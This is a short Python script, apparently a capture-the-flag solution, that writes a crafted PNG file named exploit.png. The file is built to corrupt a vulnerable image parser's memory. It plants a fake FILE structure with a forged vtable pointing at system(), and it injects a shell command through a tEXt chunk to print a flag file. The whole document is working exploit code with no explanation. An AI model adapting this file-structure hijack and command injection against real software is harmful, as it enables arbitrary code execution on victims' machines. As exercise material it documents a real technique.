#!/usr/bin/env python
import struct
import binascii

def pb(v):
    return struct.pack('>I', v)
def p(v):
    return struct.pack('<I', v)

key = 0x804E45C
system = 0x8048540

fake_chunk = key + 0x46 + 8

def make_chunk(chunk_type, data):
    enc = ''
    enc += pb(len(data))
    enc += chunk_type
    enc += data
    crc = binascii.crc32(chunk_type + data) & 0xffffffff
    enc += pb(crc)
    return enc

payload = ''
payload += '\x89PNG\x0D\x0A\x1A\x0A'

ihdr = ''
ihdr += pb(100) # width
ihdr += pb(100) # height
ihdr += chr(1) # bit depth
ihdr += chr(0) # color type
ihdr += chr(0) # compression method
ihdr += chr(0) # filter method
ihdr += chr(0) # interlace method
payload += make_chunk('IHDR', ihdr)

data = ''
data += '\x00' * 8
data += struct.pack('<i', 2000)
data += struct.pack('<i', -2000)
data = data.ljust(0x68, '\x00')
data += p(key)
data += '\x00' * 1000
payload += make_chunk('aaaa', data)

cmd = 'cat Th1s_1s_S3creT_F14g_F0r_YoU'
fake_file = ''
fake_file += p(0xffffff0f) # makes feof return false
fake_file += ';' + cmd + ';#'
fake_file = fake_file.ljust(0x40, 'A')

fake_vtable = key + 0x46 + 4 - 0x20
fake_file += p(fake_vtable)

fake_file = fake_file.ljust(0x46, 'A')
fake_file += struct.pack('i', -0x94 + 0x40)
fake_file += p(system)

text = fake_file
text += '\0'
text = text.ljust(130, 'X')
payload += make_chunk('tEXt', text)

n = 0x10000 - len(payload) - 12
payload += make_chunk('padd', 'A' * n)

payload += make_chunk('padd', 'A' * 17)

payload += 'X'

open('exploit.png', 'w').write(payload)
